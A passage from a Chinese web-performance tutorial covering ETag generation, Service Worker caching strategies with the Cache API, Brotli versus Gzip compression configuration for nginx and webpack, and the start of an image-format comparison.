align="left">精确但消耗CPU</td></tr><tr><td align="left">动态API</td><td align="left">弱ETag（版本号&#x2F;时间戳）</td><td align="left">ETag: W&#x2F;“v1.2”</td><td align="left">高效但粒度粗</td></tr><tr><td align="left">大文件</td><td align="left">分段哈希</td><td align="left">ETag: “5d83c-17a9:10”</td><td align="left">支持Range请求验证</td></tr></tbody></table><p>Node.js 实现：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-comment">// 强ETag生成</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">generateStrongEtag</span>(<span class="hljs-params">filePath</span>) &#123;<br>  <span class="hljs-keyword">const</span> content = fs.<span class="hljs-title function_">readFileSync</span>(filePath);<br>  <span class="hljs-keyword">const</span> hash = crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>).<span class="hljs-title function_">update</span>(content).<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`&quot;<span class="hljs-subst">$&#123;hash&#125;</span>&quot;`</span>;<br>&#125;<br><br><span class="hljs-comment">// 弱ETag生成</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">generateWeakEtag</span>(<span class="hljs-params">version</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`W/&quot;<span class="hljs-subst">$&#123;version&#125;</span>&quot;`</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>总结</strong></p><ol><li>所有可缓存资源设置ETag或Last-Modified</li><li>静态资源优先使用强ETag</li><li>动态API使用弱ETag（版本号）</li><li>禁用不必要资源的Last-Modified</li><li>配合Cache-Control定义缓存周期</li><li>分布式环境确保验证器一致性</li></ol><h3 id="Service-Worker-离线缓存策略（Cache-API）"><a href="#Service-Worker-离线缓存策略（Cache-API）" class="headerlink" title="Service Worker 离线缓存策略（Cache API）"></a>Service Worker 离线缓存策略（Cache API）</h3><p><strong>核心机制</strong></p><p>技术架构：</p><pre class="mermaid">graph LR    A[浏览器主线程] --> B[Service Worker]    B --> C[Cache API]    B --> D[Fetch API]    C --> E[缓存存储]    D --> F[网络请求]</pre><ul><li>独立线程：在浏览器后台运行，不阻塞主线程</li><li>生命周期：注册 → 安装 → 激活 → 拦截请求 → 终止</li><li>作用域限制：仅能控制同源下的 scope 路径</li></ul><p><strong>Cache API 核心操作</strong></p><p>缓存操作指令集：</p><table><thead><tr><th align="left">方法</th><th align="left">功能</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">caches.open(name)</td><td align="left">创建&#x2F;访问命名缓存空间</td><td align="left">const cache &#x3D; await caches.open(‘v1’)</td></tr><tr><td align="left">cache.add(url)</td><td align="left">缓存单个请求</td><td align="left">cache.add(‘&#x2F;styles.css’)</td></tr><tr><td align="left">cache.addAll(urls)</td><td align="left">批量缓存请求</td><td align="left">cache.addAll(assets)</td></tr><tr><td align="left">cache.put(req, res)</td><td align="left">手动存储响应</td><td align="left">cache.put(event.request, response)</td></tr><tr><td align="left">cache.match(req)</td><td align="left">查找缓存匹配</td><td align="left">cache.match(event.request)</td></tr><tr><td align="left">cache.delete(req)</td><td align="left">删除特定缓存</td><td align="left">cache.delete(‘&#x2F;old.js’)</td></tr><tr><td align="left">caches.delete(name)</td><td align="left">删除整个缓存库</td><td align="left">caches.delete(‘v1’)</td></tr><tr><td align="left">caches.keys()</td><td align="left">列出所有缓存库名称</td><td align="left">const keys &#x3D; await caches.keys()</td></tr></tbody></table><p><strong>离线缓存策略</strong></p><p>(1) 缓存优先（Cache First）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">respondWith</span>(<br>    caches.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cached</span> =&gt;</span> cached || <span class="hljs-title function_">fetch</span>(event.<span class="hljs-property">request</span>))<br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><ul><li>适用场景：静态资源（CSS&#x2F;JS&#x2F;图片）</li><li>优势：离线可用，极速响应</li><li>风险：可能返回过期内容</li></ul><p>(2) 网络优先（Network First）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">event.<span class="hljs-title function_">respondWith</span>(<br>  <span class="hljs-title function_">fetch</span>(event.<span class="hljs-property">request</span>)<br>    .<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> caches.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>))<br>);<br></code></pre></td></tr></table></figure><ul><li>适用场景：实时数据（股票&#x2F;新闻）</li><li>优势：内容最新</li><li>风险：弱网环境延迟高</li></ul><p>(3) 增量缓存（Stale-While-Revalidate）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">event.<span class="hljs-title function_">respondWith</span>(<br>  caches.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cached</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> fetchPromise = <span class="hljs-title function_">fetch</span>(event.<span class="hljs-property">request</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">netRes</span> =&gt;</span> &#123;<br>      <span class="hljs-comment">// 更新缓存</span><br>      caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v1&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> cache.<span class="hljs-title function_">put</span>(event.<span class="hljs-property">request</span>, netRes));<br>      <span class="hljs-keyword">return</span> netRes.<span class="hljs-title function_">clone</span>();<br>    &#125;);<br>    <span class="hljs-keyword">return</span> cached || fetchPromise;<br>  &#125;)<br>);<br></code></pre></td></tr></table></figure><ul><li>适用场景：频繁更新资源（用户头像&#x2F;评论）</li><li>优势：平衡速度与新鲜度</li><li>开销：额外网络请求</li></ul><p>(4) 仅缓存（Cache Only）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">event.<span class="hljs-title function_">respondWith</span>(caches.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>));<br></code></pre></td></tr></table></figure><ul><li>适用场景：核心离线资源（App Shell）</li><li>风险：未缓存资源直接失败</li></ul><p><strong>预缓存策略（安装阶段）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Service Worker 安装阶段</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;install&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v1&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> <br>      cache.<span class="hljs-title function_">addAll</span>([<br>        <span class="hljs-string">&#x27;/&#x27;</span>,<br>        <span class="hljs-string">&#x27;/index.html&#x27;</span>,<br>        <span class="hljs-string">&#x27;/styles/main.css&#x27;</span>,<br>        <span class="hljs-string">&#x27;/scripts/app.js&#x27;</span>,<br>        <span class="hljs-string">&#x27;/images/logo.webp&#x27;</span><br>      ])<br>    )<br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><ul><li>event.waitUntil：延迟安装直到缓存完成</li><li>版本控制：每次更新使用新缓存名（v2, v3）</li><li>缓存清理：激活阶段删除旧缓存：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;activate&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">keys</span> =&gt;</span> <br>      <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(keys.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> key !== <span class="hljs-string">&#x27;v2&#x27;</span> &amp;&amp; caches.<span class="hljs-title function_">delete</span>(key)))<br>    )<br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>动态缓存策略（运行时）</strong></p><p>按需缓存：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  <span class="hljs-comment">// 仅缓存GET请求和同源资源</span><br>  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">request</span>.<span class="hljs-property">method</span> === <span class="hljs-string">&#x27;GET&#x27;</span> &amp;&amp; <br>      event.<span class="hljs-property">request</span>.<span class="hljs-property">url</span>.<span class="hljs-title function_">startsWith</span>(self.<span class="hljs-property">location</span>.<span class="hljs-property">origin</span>)) &#123;<br>    event.<span class="hljs-title function_">respondWith</span>(<br>      <span class="hljs-title function_">fetch</span>(event.<span class="hljs-property">request</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">netRes</span> =&gt;</span> &#123;<br>        <span class="hljs-comment">// 克隆响应（流只能使用一次）</span><br>        <span class="hljs-keyword">const</span> resClone = netRes.<span class="hljs-title function_">clone</span>();<br>        caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;dynamic&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> <br>          cache.<span class="hljs-title function_">put</span>(event.<span class="hljs-property">request</span>, resClone)<br>        );<br>        <span class="hljs-keyword">return</span> netRes;<br>      &#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> caches.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>))<br>    );<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>缓存更新策略</strong></p><p>(1) 版本化资源</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 监听消息（主线程发送更新命令）</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">data</span> === <span class="hljs-string">&#x27;update&#x27;</span>) &#123;<br>    caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v2&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> <br>      cache.<span class="hljs-title function_">addAll</span>([<span class="hljs-string">&#x27;/new-style.css&#x27;</span>, <span class="hljs-string">&#x27;/new-app.js&#x27;</span>])<br>    );<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>(2) 内容 Hash 校验</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 检查资源更新</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">checkUpdate</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">url</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> cacheRes = <span class="hljs-keyword">await</span> caches.<span class="hljs-title function_">match</span>(url);<br>  <span class="hljs-keyword">const</span> netRes = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url);<br>  <br>  <span class="hljs-comment">// 比较ETag</span><br>  <span class="hljs-keyword">if</span> (cacheRes.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;ETag&#x27;</span>) !== netRes.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;ETag&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">const</span> cache = <span class="hljs-keyword">await</span> caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v1&#x27;</span>);<br>    <span class="hljs-keyword">await</span> cache.<span class="hljs-title function_">put</span>(url, netRes.<span class="hljs-title function_">clone</span>());<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>性能优化技巧</strong></p><p>(1) 缓存分段</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CACHE_TYPES</span> = &#123;<br>  <span class="hljs-attr">CORE</span>: <span class="hljs-string">&#x27;core-v1&#x27;</span>,    <span class="hljs-comment">// 核心App Shell</span><br>  <span class="hljs-attr">STATIC</span>: <span class="hljs-string">&#x27;static-v1&#x27;</span>, <span class="hljs-comment">// 不常变资源</span><br>  <span class="hljs-attr">DYNAMIC</span>: <span class="hljs-string">&#x27;dynamic&#x27;</span>   <span class="hljs-comment">// 经常变资源</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) 缓存容量控制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 限制动态缓存数量</span><br>caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;dynamic&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> &#123;<br>  cache.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">keys</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (keys.<span class="hljs-property">length</span> &gt; <span class="hljs-number">100</span>) cache.<span class="hljs-title function_">delete</span>(keys[<span class="hljs-number">0</span>]);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>(3) 缓存过期</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 定时清理旧缓存</span><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;dynamic&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> <br>    cache.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">keys</span> =&gt;</span> keys.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(key.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;date&#x27;</span>)) &gt; <span class="hljs-number">86400000</span>) &#123;<br>        cache.<span class="hljs-title function_">delete</span>(key);<br>      &#125;<br>    &#125;))<br>  );<br>&#125;, <span class="hljs-number">3600000</span>);<br></code></pre></td></tr></table></figure><p><strong>安全注意事项</strong></p><ul><li>HTTPS 强制要求：Service Worker 仅限安全上下文</li><li>缓存敏感数据：避免缓存私密内容（如 Cache-Control: private）</li><li>跨域资源限制：<ul><li>缓存跨域资源需设置 CORS 响应头</li><li>fetch 模式需为 cors</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">cache.<span class="hljs-title function_">put</span>(<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>, &#123; <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;cors&#x27;</span> &#125;))<br></code></pre></td></tr></table></figure><p><strong>浏览器兼容性</strong></p><table><thead><tr><th align="left">浏览器</th><th align="left">支持版本</th><th align="left">关键限制</th></tr></thead><tbody><tr><td align="left">Chrome</td><td align="left">40+</td><td align="left">完整支持</td></tr><tr><td align="left">Firefox</td><td align="left">44+</td><td align="left">隐私模式受限</td></tr><tr><td align="left">Safari</td><td align="left">11.1+</td><td align="left">生命周期管理差异</td></tr><tr><td align="left">Edge</td><td align="left">17+</td><td align="left">完整支持</td></tr><tr><td align="left">移动端兼容</td><td align="left">Android 5+ &#x2F; iOS 11.3+</td><td align="left">部分API限制</td></tr></tbody></table><p><strong>总结</strong></p><ol><li>所有静态资源预缓存</li><li>实现缓存清理机制（activate阶段）</li><li>动态资源设置容量上限</li><li>区分核心&#x2F;静态&#x2F;动态缓存策略</li><li>添加缓存更新提示逻辑</li><li>配置HTTP缓存头协同（max-age&#x3D;0 绕过SW缓存）</li></ol><h2 id="2-3-资源压缩与交付"><a href="#2-3-资源压缩与交付" class="headerlink" title="2.3 资源压缩与交付"></a>2.3 资源压缩与交付</h2><h3 id="Brotli-vs-Gzip-压缩算法"><a href="#Brotli-vs-Gzip-压缩算法" class="headerlink" title="Brotli vs Gzip 压缩算法"></a>Brotli vs Gzip 压缩算法</h3><p><strong>核心机制对比</strong></p><table><thead><tr><th align="left">维度</th><th align="left">Gzip (DEFLATE)</th><th align="left">Brotli</th></tr></thead><tbody><tr><td align="left">算法基础</td><td align="left">LZ77 + 霍夫曼编码</td><td align="left">LZ77 + 二阶上下文建模</td></tr><tr><td align="left">诞生时间</td><td align="left">1992年（RFC 1951）</td><td align="left">2013年（Google开发）</td></tr><tr><td align="left">压缩级别</td><td align="left">1-9（默认6）</td><td align="left">0-11（默认11）</td></tr><tr><td align="left">核心优势</td><td align="left">广泛兼容，CPU消耗低</td><td align="left">高压缩率（尤其文本资源）</td></tr><tr><td align="left">字典支持</td><td align="left">无预定义字典</td><td align="left">内置120KB静态字典（含HTML&#x2F;CSS&#x2F;JS常见标记）</td></tr></tbody></table><p><strong>浏览器兼容性</strong></p><table><thead><tr><th align="left">浏览器</th><th align="left">Gzip支持</th><th align="left">Brotli支持</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">Chrome</td><td align="left">✅ 全版本</td><td align="left">✅ 49+</td><td align="left">Android 5.0+</td></tr><tr><td align="left">Firefox</td><td align="left">✅ 全版本</td><td align="left">✅ 44+</td><td align="left"></td></tr><tr><td align="left">Safari</td><td align="left">✅ 全版本</td><td align="left">✅ 11+ (macOS&#x2F;iOS)</td><td align="left">macOS High Sierra+</td></tr><tr><td align="left">Edge</td><td align="left">✅ 全版本</td><td align="left">✅ 15+</td><td align="left"></td></tr><tr><td align="left">IE 11</td><td align="left">✅</td><td align="left">❌</td><td align="left">不支持</td></tr></tbody></table><p><strong>服务器配置策略</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 启用Gzip</span><br><span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">gzip_types</span> text/plain text/css application/json application/javascript;<br><span class="hljs-attribute">gzip_comp_level</span> <span class="hljs-number">6</span>;  <span class="hljs-comment"># 推荐6（平衡模式）</span><br><br><span class="hljs-comment"># 启用Brotli（需安装brotli模块）</span><br><span class="hljs-attribute">brotli</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">brotli_types</span> text/plain text/css application/json application/javascript;<br><span class="hljs-attribute">brotli_comp_level</span> <span class="hljs-number">6</span>; <span class="hljs-comment"># 生产环境推荐6（非11）</span><br></code></pre></td></tr></table></figure><p>压缩级别选择建议：</p><table><thead><tr><th align="left">场景</th><th align="left">Gzip级别</th><th align="left">Brotli级别</th><th align="left">理由</th></tr></thead><tbody><tr><td align="left">实时压缩（动态）</td><td align="left">1-3</td><td align="left">0-4</td><td align="left">速度优先，降低CPU负载</td></tr><tr><td align="left">预压缩（静态）</td><td align="left">9</td><td align="left">11</td><td align="left">体积优先，构建时完成压缩</td></tr></tbody></table><p><strong>预压缩实践</strong></p><p>(1) webpack 配置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 同时生成gzip和br预压缩文件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">CompressionPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;compression-webpack-plugin&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompressionPlugin</span>(&#123;  <span class="hljs-comment">// gzip</span><br>      <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;gzip&#x27;</span>,<br>      <span class="hljs-attr">threshold</span>: <span class="hljs-number">10240</span>,<br>      <span class="hljs-attr">minRatio</span>: <span class="hljs-number">0.8</span><br>    &#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompressionPlugin</span>(&#123;  <span class="hljs-comment">// brotli</span><br>      <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;[path][base].br&#x27;</span>,<br>      <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;brotliCompress&#x27;</span>,<br>      <span class="hljs-attr">threshold</span>: <span class="hljs-number">10240</span>,<br>      <span class="hljs-attr">minRatio</span>: <span class="hljs-number">0.8</span>,<br>      <span class="hljs-attr">compressionOptions</span>: &#123; <span class="hljs-attr">level</span>: <span class="hljs-number">11</span> &#125;<br>    &#125;)<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) nginx 配置</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> / &#123;<br>  <span class="hljs-comment"># 优先返回预压缩的br文件</span><br>  <span class="hljs-attribute">brotli_static</span> <span class="hljs-literal">on</span>;<br>  <br>  <span class="hljs-comment"># 若无br则返回gzip</span><br>  <span class="hljs-attribute">gzip_static</span> <span class="hljs-literal">on</span>;<br>  <br>  <span class="hljs-comment"># 动态压缩回退</span><br>  <span class="hljs-attribute">brotli</span> <span class="hljs-literal">on</span>;<br>  <span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>请求头协商机制</strong></p><p>(1) 客户端声明支持</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/main.js</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br  # 声明支持br<br></code></pre></td></tr></table></figure><p>(2) 服务端响应</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"># 返回Brotli压缩<br><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Content-Encoding</span><span class="hljs-punctuation">: </span>br<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><br><span class="language-apache"><span class="hljs-comment"># 返回Gzip压缩</span></span><br><span class="language-apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK</span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Encoding: gzip</span><br><span class="language-apache"><span class="hljs-attribute">Vary</span>: Accept-Encoding</span><br></code></pre></td></tr></table></figure><p><strong>特殊注意事项</strong></p><ul><li>动态内容压缩：避免对已压缩格式（JPEG&#x2F;PNG&#x2F;WOFF2）二次压缩</li><li>CPU开销控制：动态Brotli级别≥7可能触发CPU过载（监控服务器负载）</li><li>缓存穿透风险：不同压缩算法需单独缓存：Vary: Accept-Encoding 必须设置</li></ul><h3 id="图片优化：WebP-AVIF格式、响应式图片（srcset）、渐进加载"><a href="#图片优化：WebP-AVIF格式、响应式图片（srcset）、渐进加载" class="headerlink" title="图片优化：WebP&#x2F;AVIF格式、响应式图片（srcset）、渐进加载"></a>图片优化：WebP&#x2F;AVIF格式、响应式图片（srcset）、渐进加载</h3><p><strong>现代图片格式对比</strong></p><table><thead><tr><th align="left">维度</th><th align="left">JPEG</th><th align="left">PNG</th><th align="left">WebP</th><th align="left">AVIF</th></tr></thead><tbody><tr><td align="left">压缩算法</td><td align="left">离散余弦变换</td><td align="left">无损DEFLATE</td><td align="left">VP8&#x2F;VP9帧内编码</td><td align="left">AV1帧内编码</td></tr><tr><td align="left">透明度</td><td align="left">不支持</td><td align="left">支持</td><td align="left">支持</td><td align="left">支持</td></tr><tr><td align="left">动画</td><td align="left">不支持</td><td align="left">支持（APNG）</td><td align="left">支持</td><td align="left">支持</td></tr><tr><td align="left">HDR&#x2F;宽色域</td><td align="left">有限支持</td><td align="left">有限支持</td><td align="left">支持</td><td align="left">完整支持（10bit）</td></tr></tbody></table><p><strong>WebP 实施策略</strong></p><p>(1) 兼容性处理</p><figure class="highlight 